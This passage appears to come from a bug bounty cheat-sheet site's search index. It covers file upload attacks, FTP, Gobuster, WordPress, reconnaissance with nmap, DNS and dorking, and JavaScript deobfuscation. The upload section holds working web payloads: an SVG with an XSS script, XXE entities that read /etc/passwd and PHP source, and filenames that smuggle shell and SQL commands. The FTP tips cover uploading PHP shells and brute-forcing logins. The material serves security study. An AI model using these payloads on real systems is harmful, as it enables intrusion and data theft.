text/html, web apps may show it as an HTML document instead of an image, thus the XSS payload would be triggered.</li> <li>Scalable Vector Graphics (SVG) images are XML-based. For this reason, we can modify their XML data to include an XSS payload: </li> </ul> XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;\n&lt;svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" width=\"1\" height=\"1\"&gt;\n    &lt;rect x=\"1\" y=\"1\" width=\"1\" height=\"1\" fill=\"green\" stroke=\"black\" /&gt;\n    &lt;script type=\"text/javascript\"&gt;alert(window.origin);&lt;/script&gt;\n&lt;/svg&gt;\n</code></pre>"},{"location":"bug-bounty-guide/file-upload-attacks/#xxe","title":"XXE","text":"<ul> <li>SVG/XML example:</li> </ul> XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;svg&gt;&amp;xxe;&lt;/svg&gt;\n</code></pre> <ul> <li>Another example but to read the web apps source code:</li> </ul> XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt; ]&gt;\n&lt;svg&gt;&amp;xxe;&lt;/svg&gt;\n</code></pre> <ul> <li>View page source of the upload page to see the returned file from above payload.</li> <li>PDF, Word Documents, PowerPoint Documents all include XML elements.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks/#other-upload-attacks","title":"Other Upload Attacks","text":"Attack Type Description Injections in File Name When file name is displayed on page (reflected) e.g. <code>file$(whoami).jpg</code>, <code>file`whoami`.jpg</code>, <code>file.jpg\\|\\|whoami</code>, <code>&lt;script&gt;alert(window.origin);&lt;/script&gt;.jpeg</code>,    <code>file';select+sleep(5);--.jpg</code> Upload Directory Disclosure When no access to the link or uploaded file, use other methods to find the uploads directory i.e. fuzzing, LFI, XXE, forcing error messages (upload file with a name that already exists/extremely long name) Windows-specific Attacks Using reserved characters ("},{"location":"bug-bounty-guide/ftp-cheat/","title":"FTP Cheat Sheet","text":""},{"location":"bug-bounty-guide/ftp-cheat/#overview","title":"Overview","text":"<p>FTP (File Transfer Protocol) is used to transfer files between a client and server. In bug bounty hunting, it can be leveraged for reconnaissance (e.g., discovering open FTP servers), exploitation (e.g., uploading malicious files), or data exfiltration.</p>"},{"location":"bug-bounty-guide/ftp-cheat/#basic-commands","title":"Basic Commands","text":"Command Description Example <code>ftp &lt;hostname&gt;</code> Connect to an FTP server <code>ftp ftp.example.com</code> <code>open &lt;hostname&gt; &lt;port&gt;</code> Open a connection to a specific host and port <code>open ftp.example.com 21</code> <code>user &lt;username&gt; &lt;password&gt;</code> Log in with username and password <code>user admin password123</code> <code>anonymous</code> Attempt anonymous login (no credentials) <code>anonymous</code> <code>ls</code> or <code>dir</code> List files in the current directory <code>ls</code> <code>cd &lt;directory&gt;</code> Change to a specified directory <code>cd /public</code> <code>get &lt;filename&gt;</code> Download a file from the server <code>get sensitive.txt</code> <code>put &lt;filename&gt;</code> Upload a file to the server <code>put shell.php</code> <code>binary</code> Switch to binary mode for non-text files <code>binary</code> <code>ascii</code> Switch to ASCII mode for text files <code>ascii</code> <code>bye</code> or <code>quit</code> Disconnect from the FTP server <code>bye</code> <p>Tip: <code>ftp ftp://username:password\\!@localhost</code> local connection with known credentials, after connection through ssh for example.</p>"},{"location":"bug-bounty-guide/ftp-cheat/#commonly-used-flags","title":"Commonly Used Flags","text":"Flag Purpose <code>-v</code> Verbose output, showing detailed connection and transfer info. <code>-i</code> Turns off interactive prompting during multiple file transfers. <code>-n</code> Disables auto-login upon initial connection. <code>-p</code> Enables passive mode to traverse firewalls (e.g., <code>ftp -p ftp.example.com</code>)."},{"location":"bug-bounty-guide/ftp-cheat/#exploitation-tips","title":"Exploitation Tips","text":"<ul> <li>Anonymous Access: Test <code>anonymous</code> login to upload files or exfiltrate data if permitted (username: anonymous and password: user@domain.com when prompted).</li> <li>Brute Forcing: Use tools like Hydra (<code>hydra -l user -P pass.txt ftp://ftp.example.com</code>) to guess credentials.</li> <li>File Upload: Upload malicious scripts (e.g., PHP shells) if write access is granted.</li> </ul>"},{"location":"bug-bounty-guide/gobuster-cheat/","title":"Gobuster Cheat Sheet","text":""},{"location":"bug-bounty-guide/gobuster-cheat/#overview","title":"Overview","text":"<p>Gobuster is a fast and flexible tool for brute-forcing directories, files, DNS names, and virtual hosts, widely used in bug bounty reconnaissance.</p>"},{"location":"bug-bounty-guide/gobuster-cheat/#basic-commands","title":"Basic Commands","text":"Command Description Example <code>gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;</code> Brute-force directories and files on a web server. <code>gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt</code> <code>gobuster dns -d &lt;domain&gt; -w &lt;wordlist&gt;</code> Enumerate subdomains via DNS brute-forcing. <code>gobuster dns -d example.com -w subdomains.txt</code> <code>gobuster vhost -u &lt;url&gt; -w &lt;wordlist&gt;</code> Discover virtual hosts on a target IP. <code>gobuster vhost -u http://10.10.10.10 -w vhosts.txt</code>"},{"location":"bug-bounty-guide/gobuster-cheat/#commonly-used-flags","title":"Commonly Used Flags","text":"Flag Purpose <code>-u</code> Specifies the target URL or domain (e.g., <code>-u http://example.com</code>). <code>-w</code> Defines the wordlist file for brute-forcing (e.g., <code>-w /usr/share/wordlists/dirb/common.txt</code>). <code>-t</code> Sets the number of concurrent threads (e.g., <code>-t 50</code> for faster scanning). <code>-x</code> Specifies file extensions to test (e.g., <code>-x php,txt</code> for <code>.php</code> and <code>.txt</code>). <code>-k</code> Ignores SSL/TLS errors (e.g., <code>-k</code> for self-signed certificates). <code>-o</code> Outputs results to a file (e.g., <code>-o results.txt</code>). <code>-s</code> Filters by HTTP status codes (e.g., <code>-s 200,204</code> to show only 200 or 204 responses). <code>-e</code> Expands results to show full URLs (e.g., <code>-e</code> for detailed output)."},{"location":"bug-bounty-guide/gobuster-cheat/#advanced-usage","title":"Advanced Usage","text":"Command Description Example <code>gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt; -x php,html -t 50 -k</code> Directory brute-forcing with extensions, threads, and SSL bypass. <code>gobuster dir -u https://example.com -w common.txt -x php,html -t 50 -k</code> <code>gobuster dns -d &lt;domain&gt; -w &lt;wordlist&gt; -t 100 -o subdomains.txt</code> Aggressive subdomain enumeration with high threads and output. <code>gobuster dns -d example.com -w subdomains-top1million-5000.txt -t 100 -o subdomains.txt</code> <code>gobuster vhost -u &lt;url&gt; -w &lt;wordlist&gt; -t 30 -s 200</code> Virtual host scanning with thread count and status filter. <code>gobuster vhost -u http://10.10.10.10 -w vhosts.txt -t 30 -s 200</code>"},{"location":"bug-bounty-guide/gobuster-cheat/#wordlists","title":"Wordlists","text":"<ul> <li>Directories/Files: <code>/usr/share/wordlists/dirb/common.txt</code>, <code>/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></li> <li>Subdomains: <code>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></li> <li>Virtual Hosts: Custom lists like <code>vhosts.txt</code> with common names (e.g., <code>admin</code>, <code>dev</code>).</li> </ul>"},{"location":"bug-bounty-guide/gobuster-cheat/#tips","title":"Tips","text":"<ul> <li>Use <code>-t 10-100</code> based on target sensitivity to avoid detection.</li> <li>Combine with Nmap to verify open ports before scanning.</li> <li>Check <code>robots.txt</code> for hints to seed wordlists.</li> </ul>"},{"location":"bug-bounty-guide/gobuster-cheat/#tools","title":"Tools","text":"<ul> <li>Gobuster: https://github.com/OJ/gobuster</li> <li>SecLists: https://github.com/danielmiessler/SecLists</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress/","title":"Hacking WordPress","text":""},{"location":"bug-bounty-guide/hacking-wordpress/#commands","title":"Commands","text":"Command Description <code>tree -L 1</code> Lists contents of current directory <code>curl -s -X GET &lt;url&gt;</code> Makes a GET request to a webserver and receives HTML source code of requested web page <code>curl -I -X GET &lt;url&gt;</code> Prints the response header of the GET request from the requested web page <code>curl -X POST -d &lt;data&gt; &lt;url&gt;</code> Sends a POST request with data to specific webserver <code>wpscan --url &lt;url&gt; -e ap</code> Scans specific WordPress application to enumerate plugins <code>wpscan --url &lt;url&gt; -e u</code> Scans specific WordPress application to enumerate users <code>msfconsole</code> Starts Metasploit Framework <code>html2text</code> Converts redirected HTML output or files to easily readable output <code>grep &lt;pattern&gt;</code> Filters specific pattern in files or redirected output <code>jq</code> Transforms JSON input and streams of JSON entities <code>man &lt;tool&gt;</code> Man provides you with the manpage of the specific tool"},{"location":"bug-bounty-guide/information-gathering-web-edition/","title":"Information Gathering","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#netstat","title":"Netstat","text":"<p>Once a foothold has been gained (ssh creds for example) use netstat to scan for other active services</p> Bash<pre><code>netstat -tulpn | grep LISTEN\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#nmap-scans","title":"Nmap Scans","text":"<p><code>nmap localhost</code> for internal scan after initial ingress, similar to netsat above.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#scan-types","title":"Scan Types","text":"<p>Common Nmap scan types and flags with examples:</p> Scan Type Description Flag TCP SYN Scan Stealthy half-open scan for TCP ports. Example: <code>nmap -sS -T4 192.168.1.1</code> -sS TCP Connect Scan Full TCP connection scan. Example: <code>nmap -sT -p 1-1000 192.168.1.1</code> -sT UDP Scan Scan for UDP ports. Example: <code>nmap -sU -sV 192.168.1.1</code> -sU Ping Scan Host discovery without port scanning. Example: <code>nmap -sn 192.168.1.0/24</code> -sn (or -sP) Version Detection Identify service versions on open ports. Example: <code>nmap -sV -p 80,443 192.168.1.1</code> -sV OS Detection Fingerprint operating system. Example: <code>nmap -O 192.168.1.1</code> -O Script Scan Run NSE scripts for additional info. Example: <code>nmap -sC 192.168.1.1</code> -sC Aggressive Scan Combines version, OS, script, and traceroute. Example: <code>nmap -A 192.168.1.1</code> -A Idle/Zombie Scan Stealth scan using spoofed IP. Example: <code>nmap -sI zombie.host 192.168.1.1</code> -sI"},{"location":"bug-bounty-guide/information-gathering-web-edition/#commonly-used-nmap-flags","title":"Commonly Used Nmap Flags","text":"<p>Additional flags to customize Nmap scans:</p> Flag Purpose <code>-p</code> Defines a port range or specific ports to scan (e.g., <code>-p 1-1000</code> for ports 1-1000, <code>-p 80,443</code> for specific ports). <code>-T&lt;0-5&gt;</code> Sets timing template (0=paranoid to 5=insane) to control scan speed (e.g., <code>-T4</code> for faster scans). <code>-A</code> Enables aggressive scan features (version detection, OS detection, scripting, traceroute). <code>-oN</code> Outputs scan results to a normal file (e.g., <code>-oN scan.txt</code>). <code>-v</code> Increases verbosity for detailed output during the scan. <code>-Pn</code> Treats all hosts as online, skipping host discovery (useful for firewalls). <code>-iL</code> Reads targets from a file (e.g., <code>-iL targets.txt</code> for a list of IPs)."},{"location":"bug-bounty-guide/information-gathering-web-edition/#web-reconnaissance","title":"Web Reconnaissance","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#goals","title":"Goals","text":"<ul> <li>Identify Assets: Discovering all associated domains, subdomains, and IP addresses provides a map of the target's online presence.</li> <li>Uncover Hidden Information: Web reconnaissance aims to uncover directories, files, and technologies that are not readily apparent and could serve as entry points for an attacker.</li> <li>Analyse the Attack Surface: By identifying open ports, running services, and software versions, you can assess the potential vulnerabilities and weaknesses of the target.</li> <li>Gather Intelligence: Collecting information about employees, email addresses, and technologies used can aid in social engineering attacks or identifying specific vulnerabilities associated with certain software.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#active-reconnaissance","title":"Active Reconnaissance","text":"Technique Description Example Tools Risk Port Scanning Identifies open ports. Nmap scans ports 80, 443. Nmap, Masscan High Vulnerability Scanning Probes for vulnerabilities. Nessus checks for XSS. Nessus, Nikto High Network Mapping Maps network topology. Traceroute tracks hops. Traceroute, Nmap Medium-High Banner Grabbing Retrieves service banners. curl checks HTTP version. Netcat, curl Low OS Fingerprinting Detects OS type. Nmap uses -O. Nmap, Xprobe2 Low Service Enumeration Identifies service versions. Nmap -sV on port 80. Nmap Low Web Spidering Crawls website structure. Burp Spider maps pages. Burp, ZAP Spider Low-Medium"},{"location":"bug-bounty-guide/information-gathering-web-edition/#passive-reconnaissance","title":"Passive Reconnaissance","text":"Technique Description Example Tools Risk Search Engine Queries Uncovers public data. Google for employee names. Google, Shodan Very Low WHOIS Lookups Retrieves domain details. whois on example.com. whois, online Very Low DNS Analysis Identifies DNS records. dig for subdomains. dig, dnsenum Very Low Web Archive Analysis Reviews historical sites. Wayback for old pages. Wayback Machine Very Low Social Media Analysis Gathers social profiles. LinkedIn for employees. LinkedIn, OSINT Very Low Code Repositories Analyzes public code. GitHub for credentials. GitHub, GitLab Very Low"},{"location":"bug-bounty-guide/information-gathering-web-edition/#whois","title":"WHOIS","text":"<p>Bash<pre><code>whois example.com\n</code></pre> Note: WHOIS data can be inaccurate or intentionally obscured, so verify from multiple sources. Privacy services may mask the true owner.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#dns","title":"DNS","text":"<p>Bash<pre><code>dig example.com A\n</code></pre> This retrieves the A record (hostname to IPv4 address). The output includes the IP address and query details.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#dns-record-types","title":"DNS Record Types","text":"Record Type Full Name Description A Address Record Maps a hostname to its IPv4 address. AAAA IPv6 Address Record Maps a hostname to its IPv6 address. CNAME Canonical Name Record Creates an alias for a hostname, pointing to another hostname. MX Mail Exchange Record Specifies the mail server(s) responsible for handling email. NS Name Server Record Delegates a DNS zone to an authoritative name server. TXT Text Record Stores arbitrary text information, often for verification or policies. SOA Start of Authority Record Specifies administrative details about a DNS zone. SRV Service Record Defines hostname and port for specific services. PTR Pointer Record Used for reverse DNS lookups, mapping an IP to a hostname."},{"location":"bug-bounty-guide/information-gathering-web-edition/#dns-tools","title":"DNS Tools","text":"Tool Key Features Use Cases dig Versatile DNS lookup, multiple query types Manual queries, zone transfers, troubleshooting nslookup Simple DNS lookup for A, AAAA, MX Basic resolution, mail checks host Concise DNS lookup Quick A, AAAA, MX checks dnsenum Automated enumeration, brute-forcing Subdomain discovery, DNS data fierce Subdomain enumeration, wildcard detection DNS recon, target identification dnsrecon Multi-technique enumeration, various outputs Comprehensive subdomain analysis theHarvester OSINT from DNS and other sources Email, employee data collection Online DNS Lookup User-friendly lookup interfaces Quick lookups, domain checks"},{"location":"bug-bounty-guide/information-gathering-web-edition/#subdomains","title":"Subdomains","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#subdomain-enumeration","title":"Subdomain Enumeration","text":"Approach Examples Active Enumeration Brute-forcing, DNS zone transfers Passive Enumeration Certificate Transparency (CT) logs, search engine queries"},{"location":"bug-bounty-guide/information-gathering-web-edition/#brute-force-enumeration-tools","title":"Brute-Force Enumeration Tools","text":"Tool Description dnsenum Comprehensive DNS enumeration fierce User-friendly subdomain discovery dnsrecon Versatile multi-technique enumeration amass Actively maintained subdomain tool assetfinder Lightweight subdomain finder puredns Powerful DNS brute-forcing <p>Examples:</p> <p>Bash<pre><code>dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r\n</code></pre> Note: -r enables recursive subdomain brute-forcing.</p> Bash<pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://hackthebox.eu/\n</code></pre> Bash<pre><code>gobuster dns -d https://hackthebox.eu/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#dns-zone-transfers","title":"DNS Zone Transfers","text":"<p>Bash<pre><code>dig @nsztm1.digi.ninja zonetransfer.me axfr\n</code></pre> - dig: DNS lookup utility. - @ns1.example.com: Specifies the nameserver to query (e.g., ns1.example.com). - example.com: Domain to perform the lookup on. - axfr: Requests a zone transfer, retrieving all DNS records for the domain.</p> <p>Note - Many DNS servers restrict zone transfers to authorized servers. - zonetransfer.me is a service specifically setup to demonstrate the risks of zone transfers so that the dig command will return the full zone record.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#virtual-hosts","title":"Virtual Hosts","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#virtual-host-discovery-tools","title":"Virtual Host Discovery Tools","text":"Tool Description Features gobuster Multi-purpose brute-forcer Fast, custom wordlists Feroxbuster Rust-based fuzzer Recursion, filters ffuf Fast web fuzzer Custom input, filtering <p>Examples: Bash<pre><code>gobuster vhost -u http://192.0.2.1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain\ngobuster vhost -u http://web1337.inlanefreight.htb:8888 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 60 --append-domain\n</code></pre></p> <p>Common flags:</p> Flag Description -t Increase threads for faster scanning -k Ignore SSL/TLS certificate errors -o Save output to a file"},{"location":"bug-bounty-guide/information-gathering-web-edition/#certificate-transparency-ct-logs","title":"Certificate Transparency (CT) Logs","text":"<p>CT logs record SSL/TLS certificates, revealing subdomains.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#searching-ct-logs","title":"Searching CT Logs","text":"Tool Key Features Use Cases Pros Cons crt.sh User-friendly interface, domain search, SAN details Quick subdomain checks, certificate history Free, no registration Limited filtering Censys Advanced filtering, IP/certificate search In-depth analysis, misconfigurations Extensive data, API Requires registration <p>Example: Bash<pre><code>curl -s \"https://crt.sh/?q=facebook.com&amp;output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u\n</code></pre></p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#fingerprinting","title":"Fingerprinting","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#techniques","title":"Techniques","text":"Technique Description Banner Grabbing Analyzes server banners for software and version details. Analysing HTTP Headers Examines headers (e.g., Server, X-Powered-By) for tech info. Probing for Responses Sends crafted requests to elicit unique tech-specific responses. Analysing Page Content Reviews page elements (e.g., copyright) for tech clues."},{"location":"bug-bounty-guide/information-gathering-web-edition/#tools","title":"Tools","text":"Tool Description Features Wappalyzer Browser extension for tech profiling Identifies CMSs, frameworks, analytics BuiltWith Web tech profiler with reports Free/paid plans, detailed stacks WhatWeb Command-line website fingerprinting Uses signature database Nmap Versatile network scanner NSE for specialised fingerprinting Netcraft Web security and fingerprinting Tech, hosting, security reports wafw00f WAF identification tool Detects WAF type and configuration"},{"location":"bug-bounty-guide/information-gathering-web-edition/#banner-grabbing","title":"Banner Grabbing","text":"<p>Bash<pre><code>curl -I inlanefreight.com\n</code></pre> Find CMS info: Bash<pre><code>curl -s http://app.inlanefreight.local/index.php | grep '&lt;meta name=\"generator\"'\n</code></pre></p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#wafw00f","title":"Wafw00f","text":"Bash<pre><code>pip3 install git+https://github.com/EnableSecurity/wafw00f\nwafw00f inlanefreight.com\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#nikto","title":"Nikto","text":"<p>Bash<pre><code>sudo apt update &amp;&amp; sudo apt install -y perl\ngit clone https://github.com/sullo/nikto\ncd nikto/program\nchmod +x ./nikto.pl\nnikto -h inlanefreight.com -Tuning b\n</code></pre> - -h specifies the target host. - -Tuning b flag tells Nikto to only run the Software Identification modules.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#robotstxt","title":"robots.txt","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#robotstxt-structure","title":"robots.txt Structure","text":"<p>The robots.txt file is a plain text file in the website's root, using records separated by blank lines.</p> Component Description User-agent Specifies crawler or bot the rules apply to (e.g., * for all, Googlebot, Bingbot). Directives Instructions for the specified user-agent."},{"location":"bug-bounty-guide/information-gathering-web-edition/#common-directives","title":"Common Directives","text":"Directive Description Example Disallow Blocks bot from paths or patterns. Disallow: /admin/ Allow Permits specific paths despite Disallow. Allow: /public/ Crawl-delay Sets delay (seconds) between requests. Crawl-delay: 10 Sitemap Provides XML sitemap URL. Sitemap: sitemap.xml"},{"location":"bug-bounty-guide/information-gathering-web-edition/#well-known-uris","title":"Well-Known URIs","text":"<p>The .well-known standard (RFC 8615) centralizes website metadata in /.well-known/.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#examples","title":"Examples","text":"URI Suffix Description Status Reference security.txt Contact info for vulnerability reports Permanent RFC 9116 change-password URL for password change Provisional https://w3c.github.io/webappsec-change-password-url/ openid-configuration OpenID Connect configuration Permanent http://openid.net/specs/openid-connect-discovery-1_0.html assetlinks.json Verifies digital asset ownership Permanent https://github.com/google/digitalassetlinks/blob/master/well-known/specification.md mta-sts.txt SMTP MTA-STS security policy Permanent RFC 8461 <p>All well-known URIs</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#web-crawling","title":"Web Crawling","text":"<p>Web crawling maps a website's structure by following links. Analyze <code>robots.txt</code> for hidden directories.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#popular-web-crawlers","title":"Popular Web Crawlers","text":"Tool Description Burp Suite Spider Active crawler for mapping and vulnerability discovery. OWASP ZAP Open-source scanner with spider for vulnerability checks. Scrapy Python framework for custom, scalable crawling. Apache Nutch Scalable Java crawler for large-scale recon."},{"location":"bug-bounty-guide/information-gathering-web-edition/#scrapy","title":"Scrapy:","text":"<p>Using custom Scrapy spider, ReconSpider, output will be in JSON:</p> Bash<pre><code>pip3 install scrapy\nwget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip\nunzip ReconSpider.zip \npython3 ReconSpider.py http://inlanefreight.com\n</code></pre> Key Description emails Lists email addresses found on the domain. links Lists URLs of links found within the domain. external_files Lists URLs of external files such as PDFs. js_files Lists URLs of JavaScript files used by the website. form_fields Lists form fields found on the domain (empty in this example). images Lists URLs of images found on the domain. videos Lists URLs of videos found on the domain (empty in this example). audio Lists URLs of audio files found on the domain (empty in this example). comments Lists HTML comments found in the source code. <p>Searching Results: Bash<pre><code>cat results.json | jq '.emails'\ncat results.json | jq '.comments'\n</code></pre></p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#spider-code-example","title":"Spider code example","text":"Python<pre><code>import scrapy\n\nclass ExampleSpider(scrapy.Spider):\n    name = \"example\"\n    start_urls = ['http://example.com/']\n\n    def parse(self, response):\n        for link in response.css('a::attr(href)').getall():\n            if any(link.endswith(ext) for ext in self.interesting_extensions):\n                yield {\"file\": link}\n            elif not link.startswith(\"#\") and not link.startswith(\"mailto:\"):\n                yield response.follow(link, callback=self.parse)\n</code></pre> <p>Extract links: Bash<pre><code>jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u\n</code></pre></p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#search-engine-discovery","title":"Search Engine Discovery","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#google-dorking","title":"Google Dorking","text":"Operator Description Example Example Description site: Limits results to a domain. site:example.com Find all pages on example.com. inurl: Finds term in URL. inurl:login Search for login pages. filetype: Searches for specific file types. filetype:pdf Find downloadable PDFs. intitle: Finds term in title. intitle:\"confidential report\" Look for pages titled \"confidential report\". intext: Searches term in body text. intext:\"password reset\" Identify pages with \"password reset\". cache: Shows cached webpage version. cache:example.com View cached content of example.com. link: Finds pages linking to URL. link:example.com Identify sites linking to example.com. related: Finds similar websites. related:example.com Discover sites like example.com. info: Shows webpage summary. info:example.com Get details about example.com. define: Provides word/phrase definitions. define:phishing Get \"phishing\" definitions. numrange: Searches within number range. site:example.com numrange:1000-2000 Find numbers 1000-2000 on example.com. allintext: Requires all words in body. allintext:admin password reset Find pages with \"admin\" and \"password reset\". allinurl: Requires all words in URL. allinurl:admin panel Find URLs with \"admin\" and \"panel\". allintitle: Requires all words in title. allintitle:confidential report 2023 Find titles with \"confidential report 2023\". AND Requires all terms. site:example.com AND (inurl:admin OR inurl:login) Find admin/login on example.com. OR Includes any of the terms. \"linux\" OR \"ubuntu\" OR \"debian\" Search for Linux, Ubuntu, or Debian pages. NOT Excludes specified term. site:bank.com NOT inurl:login Find bank.com pages excluding login. * (wildcard) Represents any character/word. site:socialnetwork.com filetype:pdf user* manual Find user manuals in PDFs. ... (range) Finds results in numerical range. site:ecommerce.com \"price\" 100..500 Find products priced 100-500. \" \" (quotes) Searches exact phrase. \"information security policy\" Find exact \"information security policy\". - (minus) Excludes terms. site:news.com -inurl:sports Find news.com pages excluding sports. <p>Google Hacking Database</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#web-archives","title":"Web Archives","text":"<p>Web archives like the Wayback Machine store historical website snapshots:</p> Feature Description Use Case in Reconnaissance Historical Snapshots View past versions of websites. Identify past content or functionality. Hidden Directories Explore removed or hidden directories. Discover sensitive information or backups. Content Changes Track changes in content. Assess security posture evolution."},{"location":"bug-bounty-guide/information-gathering-web-edition/#automating-recon","title":"Automating Recon","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#reconnaissance-frameworks","title":"Reconnaissance Frameworks","text":"<p>These frameworks provide a complete suite of tools for web reconnaissance.</p> Framework Description FinalRecon Python tool for SSL, Whois, headers, and crawling. Recon-ng Python framework for DNS, subdomains, and exploits. theHarvester Python tool for emails, subdomains, and banners. SpiderFoot OSINT tool for IPs, domains, emails, and scanning. OSINT Framework Collection of tools for social media and records."},{"location":"bug-bounty-guide/information-gathering-web-edition/#finalrecon","title":"FinalRecon","text":"Bash<pre><code>git clone https://github.com/thewhiteh4t/FinalRecon.git\ncd FinalRecon\npip3 install -r requirements.txt\nchmod +x ./finalrecon.py\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#command-options","title":"Command Options","text":"Option Argument Description -h, --help Show the help message and exit. --url URL Specify the target URL. --headers Retrieve header information. --sslinfo Get SSL certificate information. --whois Perform a Whois lookup. --crawl Crawl the target website. --dns Perform DNS enumeration. --sub Enumerate subdomains. --dir Search for directories. --wayback Retrieve Wayback URLs. --ps Perform a fast port scan. --full Perform a full reconnaissance scan."},{"location":"bug-bounty-guide/introduction-to-web-applications/","title":"Introduction to Web Applications","text":""},{"location":"bug-bounty-guide/introduction-to-web-applications/#web-stack-combinations","title":"Web Stack Combinations","text":"Combinations Components LAMP Linux, Apache, MySQL, and PHP WAMP Windows, Apache, MySQL, and PHP WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL"},{"location":"bug-bounty-guide/introduction-to-web-applications/#owasp-top-ten-vulnerabilities","title":"OWASP Top Ten Vulnerabilities","text":"No. Vulnerability 1 Broken Access Control 2 Cryptographic Failures 3 Injection 4 Insecure Design 5 Security Misconfiguration 6 Vulnerable and Outdated Components 7 Identification and Authentication Failures 8 Software and Data Integrity Failures 9 Security Logging and Monitoring Failures 10 Server-Side Request Forgery (SSRF) <ul> <li>OWASP top 10 vulnerabilities</li> <li>OWASP web application security testing guide</li> <li>OWASP cheat sheet series</li> </ul>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#url-encoding-reference","title":"URL Encoding Reference","text":"Character URL Encoded space %20 ! %21 \" %22 # %23 $ %24 % %25 &amp; %26 ' %27 ( %28 ) %29"},{"location":"bug-bounty-guide/introduction-to-web-applications/#practicing-web-application-development-steps","title":"Practicing Web Application Development Steps","text":"Step To-Do 1 Set up a VM with a web server 2 Create an HTML page 3 Design it with CSS 4 Add some simple functions with JavaScript 5 Program a simple web application 6 Connect your web application to the database 7 Experiment with APIs 8 Test your application for various vulnerabilities and security holes 9 Try to adjust your code and configurations to close the vulnerabilities"},{"location":"bug-bounty-guide/introduction-to-web-applications/#tips","title":"Tips","text":"<ul> <li>Review source code for sensitive data exposure</li> </ul>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#helpful-links","title":"Helpful Links","text":"<ul> <li>W3Schools</li> <li>Front end practice sandbox 1</li> <li>Front end practice sandbox 2</li> <li>Front end learn test and share</li> <li>Exploit DB</li> <li>Rapid7 DB</li> <li>National Vulnerability Database</li> <li>Common Vulnerability Scoring System: User Guide</li> </ul>"},{"location":"bug-bounty-guide/javascript-deobfuscation/","title":"JavaScript Deobfuscation","text":""},{"location":"bug-bounty-guide/javascript-deobfuscation/#terms","title":"Terms","text":"Term Description Code minification Reduces code to a single line often saved as .min.js. Packing Obfuscation recognizable from the six function arguments used in the initial function \"function(p,a,c,k,e,d)\". JSFuck Programming style based in the atomic parts of JS. Uses only ()+[]! (aa and jj encode are similar). Base 64 Contains only alpha-numeric, + and /. Padded with '='. Hex Encodes each char into its hex on the ASCII table. Contains 0-9 and a-f. Ceasar Shifts each char by a fixed number Rot13 Most common ceaser cipher, shifts by 13"},{"location":"bug-bounty-guide/javascript-deobfuscation/#commands","title":"Commands","text":"Command Description <code>curl http://SERVER_IP:PORT/</code> cURL GET request <code>curl -s http://SERVER_IP:PORT/ -X POST</code> cURL POST request <code>curl -s http://SERVER_IP:PORT/ -X POST -d \"param1=sample\"</code> cURL POST with data <code>echo hackthebox | base64</code> base64 encode <code>echo ENCODED_B64 | base64 -d</code> base64 decode <code>echo hackthebox | xxd -p</code> hex encode <code>echo ENCODED_HEX | xxd -p -r</code> hex decode <code>echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 encode <code>echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 decode"},{"location":"bug-bounty-guide/javascript-deobfuscation/#useful-websites","title":"Useful 